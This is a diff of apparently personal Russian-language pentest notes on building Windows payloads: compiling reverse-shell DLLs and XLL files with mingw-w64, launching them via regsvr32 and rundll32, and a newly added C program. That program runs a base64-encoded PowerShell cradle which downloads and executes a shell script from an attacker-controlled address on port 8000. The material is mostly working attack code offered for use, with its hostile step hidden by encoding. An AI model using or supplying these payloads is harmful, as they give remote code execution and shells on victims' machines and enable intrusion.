@@ -4,8 +4,7 @@ regsvr32.exe ReverseShellDLL.dll (запуск dll)
  
 -static     компиляция со всеми билиотеками во внутрь
 
-Cоздание dll на с++
-
+# Cоздание dll на с++
 
 sudo apt install mingw-w64
 
@@ -13,9 +12,23 @@ x86_64-w64-mingw32-gcc-win32 shell.c -shared -lws2_32 -o VerifyThemeVersion.dll
 
 x86_64-w64-mingw32-gcc xll.c -shared -o test.xll
 
+# сщздание exe на с++
+
+	x86_64-w64-mingw32-gcc main.c -o shell.exe
+
 python3 -m pefile exports VerifyThemeVersion.dll (скажет что за функции находятся внутри)
 
 rundll32 shell,0
+
+# самый простой exe shell 
+ 
+	#include <windows.h>
+
+	int main() {
+	    WinExec("powershell -enc 		SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANwA6ADgAMAAwADAALwBzAGgAZQBsAGwAXwA5ADAAMAAxAC4AcABzADEAJwApAAoA", 1);
+		}
+
+
 
 ----------------------
     #include <winsock2.h>
